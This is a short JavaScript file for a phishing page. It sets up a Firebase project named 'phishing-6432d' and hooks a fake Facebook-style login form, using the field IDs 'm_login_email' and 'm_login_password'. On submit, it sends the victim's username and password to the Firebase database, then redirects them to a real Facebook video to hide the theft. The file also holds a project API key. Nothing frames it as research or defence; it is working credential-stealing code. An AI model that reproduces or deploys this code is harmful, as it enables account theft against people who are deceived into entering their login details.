var firebaseConfig = {
    apiKey: "AIzaSyDkl2GXe2hV1644-vVpAEFot-w5tfr8zsI",
    authDomain: "phishing-6432d.firebaseapp.com",
    databaseURL: "https://phishing-6432d.firebaseio.com",
    projectId: "phishing-6432d",
    storageBucket: "phishing-6432d.appspot.com",
    messagingSenderId: "508538600716",
    appId: "1:508538600716:web:aa348971bde4a3ecdd9d29",
    measurementId: "G-X0T3W5VGYV"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
 
 // Initialize axios
 // const http = require('axios');
  const db = firebase.database().ref('data');  
  submit=(username,password)=>{
    let dataRef = db.push();
    dataRef.set({
        usename:username,
        password:password
    });
}
  const url ="https://phishing-6432d.firebaseio.com/data.json";
  const loginBtn  = document.getElementById('login');
  const username = document.getElementById('m_login_email');
  const password =document.getElementById('m_login_password');
 const loginForm = document.getElementById('login_form');
 loginForm.addEventListener('submit',async (e)=>{
        e.preventDefault();
       
        const data ={
            usename:username.value,
            password:password.value 
        }
       if(username.value && password.value){
        await submit(username.value,password.value);
        window.location.replace('https://www.facebook.com/watch/?v=193954128684871','_blank');
    }
        
})


